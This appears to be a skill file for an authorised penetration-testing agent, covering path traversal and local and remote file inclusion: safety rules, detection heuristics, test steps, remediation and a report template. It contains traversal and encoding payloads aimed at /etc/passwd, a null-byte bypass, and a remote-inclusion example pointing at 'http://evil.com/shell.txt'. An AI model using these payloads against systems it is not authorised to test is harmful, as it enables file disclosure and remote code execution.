# Skill: Path Traversal (LFI/RFI) / Local File Inclusion

## Scope & Safety
- Allowed only if target is in `scope_lock.json` and ROE permits this class of testing.
- No destructive actions. No data exfiltration. No credential reuse outside test accounts.
- Focus purely on reading universally benign diagnostic files (e.g., `/etc/passwd` on Linux or `C:\Windows\win.ini` on Windows). Never attempt to extract sensitive application configs, keys, or passwords.
- No massive directory bruteforcing that could trigger protective WAFs or degrade service.

## What to Collect (Evidence Checklist)
- Requests/responses (HAR or raw) showing the injected sequence (e.g., `../../../etc/passwd`) and the server's output containing the file contents.
- Exact parameter or URL path targeted.
- Evidence of whether the vulnerability is restricted strictly to file extensions or prefixes (e.g., appending a null byte `%00` or double URL encoding).

## Detection Heuristics
- The server responds with the contents of an unintended local operating system file when `../` sequences are introduced.
- Modifying a file-loading parameter to an external URL (e.g., `http://evil.com/shell.txt`) forces the server to fetch and evaluate remote resources (Remote File Inclusion - RFI).
- Error messages explicitly indicate an `include()` or `fopen()` failure disclosing server-side path structures.

## Safe Test Procedure
1) Establish a baseline behavior using a legitimate file request via an `id` or `file` parameter (e.g., `?file=report.pdf`).
2) Inject standard traversal payloads progressively (e.g., `../`, `../../`, `../../../etc/passwd`).
3) Try variations like URL encoding (`%2e%2e%2f`), double-encoding, or prepending the root directory (`/etc/passwd`).
4) Analyze the response payload for distinctive file content artifacts like `root:x:0:0:` or `[extensions]`.
5) If suspicious, add a "Validator" task to securely confirm the LFI without extracting proprietary secrets.

## False-Positive Killers
- The parameter is exclusively used for database lookups and the return content simply resembles file content coincidentally.
- The `../` traversal is stripped explicitly and the application serves the base directory securely without expanding the path.
- The application catches the traversal path, throwing a generic HTTP 400 or HTTP 404 without ever querying the filesystem.

## Remediation Guidance
- Avoid passing user-supplied input directly into filesystem APIs (e.g., `open()`, `include()`).
- Use secure, indirect referencing (such as referencing an ID mapped to a file string inside a database) instead of direct filenames.
- Always normalize file paths and strictly enforce `startsWith` matching against authorized directories, or use secure chroot jails.

## Report-Ready Writeup Template

```markdown
### [FINDING-ID] Path Traversal / LFI on <endpoint / feature>

**Affected Component:** <endpoint / feature>
**Severity:** <high / medium>
**Confidence:** <0.0 – 1.0>

**Impact:**
An attacker can manipulate the application to disclose arbitrary files stored on the underlying operating system. This could expose application source code, sensitive configuration credentials, or internal environment variables, facilitating broader exploitation.

**Evidence:**
- <artifact path 1> — Demonstrates the HTTP request containing the `../../../../etc/passwd` payload in the `file` query parameter.
- <artifact path 2> — Showcases the HTTP response disclosing the unredacted contents of the server's `/etc/passwd` file.

**Safe Reproduction Steps:**
1. Send an HTTP GET request to `<endpoint>?file=../../../../etc/passwd`.
2. Evaluate the HTTP response body.
3. Note the explicit contents containing traditional UNIX user account footprints, such as `root:x:0:0:root:/root:/bin/bash`.

**Suggested Fix:**
Implement robust validation using an indirect file referencing mechanism based on strict identifier mapping. If direct file requests are required, strictly sanitize user input by stripping path characters `../` and fully normalizing the requested path before validating that it strongly exists within an explicitly allowed base directory.
```
